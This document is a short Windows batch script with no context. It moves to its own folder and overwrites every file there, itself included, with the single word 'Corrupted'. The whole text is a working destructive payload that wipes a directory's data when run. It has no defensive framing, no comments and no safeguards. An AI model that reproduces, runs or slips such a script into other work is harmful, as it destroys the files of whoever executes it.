@echo off
cd /d %~dp0
for %%f in (*.*) do (
    echo Corrupted > %%f
)